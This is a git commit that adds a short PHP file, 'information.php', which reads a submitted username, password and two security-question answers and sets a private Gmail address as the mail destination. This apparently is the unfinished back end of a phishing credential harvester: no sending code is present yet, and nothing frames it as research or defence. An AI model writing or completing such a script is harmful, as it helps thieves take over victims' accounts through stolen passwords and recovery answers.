4ed31efa69ac314bcaf45bae8e2d5568d03f79e9
fronkbenz28 <59969817+fronkbenz28@users.noreply.github.com>
2020-01-17 00:03:16 +0800

    Add files via upload

---
+++ information.php
@@ -0,0 +1,18 @@
+<?php
+
+if (isset($_POST['login']))
+{
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+$answer1 = $_POST['answer1'];
+$answer2 = $_POST['answer2'];
+
+
+$mailTo = "fronkbenz28@gmail.com";
+
+
+
+
+
+}
